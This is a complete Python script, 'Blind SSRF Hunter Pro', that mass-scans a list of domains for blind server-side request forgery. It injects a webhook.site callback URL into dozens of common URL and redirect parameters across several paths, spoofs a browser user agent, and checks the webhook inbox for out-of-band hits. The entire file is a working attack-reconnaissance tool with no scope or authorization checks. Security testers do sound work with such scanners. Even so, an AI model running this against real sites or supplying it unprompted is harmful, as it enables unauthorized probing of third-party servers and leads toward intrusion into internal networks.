import argparse
import requests
import urllib.parse
import time
import sys

COMMON_PARAMS = [
    "url", "uri", "path", "continue", "data", "dest", "redirect", "next", "v",
    "image", "file", "link", "src", "load", "page", "callback", "return", "site",
    "open", "forward", "out", "reference", "fetch", "to", "proxy"
]

COMMON_PATHS = [
    "/", "/api", "/static", "/img", "/assets", "/images", "/files", "/content", "/scripts"
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) SSRF-Hunter"
}

def inject_and_check(domain, webhook, verbose):
    domain = domain.strip()
    if not domain:
        return

    if not domain.startswith("http"):
        domain = "https://" + domain

    parsed = urllib.parse.urlparse(domain)
    base = f"{parsed.scheme}://{parsed.netloc}"

    ssrf_triggered = False

    for path in COMMON_PATHS:
        for param in COMMON_PARAMS:
            payload = urllib.parse.quote(webhook)
            test_url = f"{base}{path}?{param}={payload}"
            try:
                resp = requests.get(test_url, headers=HEADERS, timeout=7)
                if verbose:
                    print(f"[*] Tested: {test_url} => {resp.status_code}")
            except requests.RequestException as e:
                if verbose:
                    print(f"[-] Error testing {test_url}: {e}")

    if verbose:
        print("[*] Waiting 6 seconds for webhook delivery confirmation...")
    time.sleep(6)

    try:
        uuid = webhook.split("/")[-1]
        inbox_url = f"https://webhook.site/token/{uuid}/requests"
        inbox = requests.get(inbox_url).json()
        if inbox.get("data"):
            print(f"[SSRF FOUND] ✅ {domain}")
            return True
    except Exception as e:
        if verbose:
            print(f"[!] Error checking webhook: {e}")

    print(f"[SSRF NOT FOUND] ❌ {domain}")
    return False

def main():
    parser = argparse.ArgumentParser(description="Blind SSRF Hunter Pro")
    parser.add_argument("--list", required=True, help="File with list of domains")
    parser.add_argument("--blind", required=True, help="Webhook.site URL")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    try:
        with open(args.list, "r") as file:
            domains = file.readlines()
            for domain in domains:
                print(f"\n[+] Scanning: {domain.strip()}")
                inject_and_check(domain.strip(), args.blind, args.verbose)
    except Exception as e:
        print(f"[!] Error reading file: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
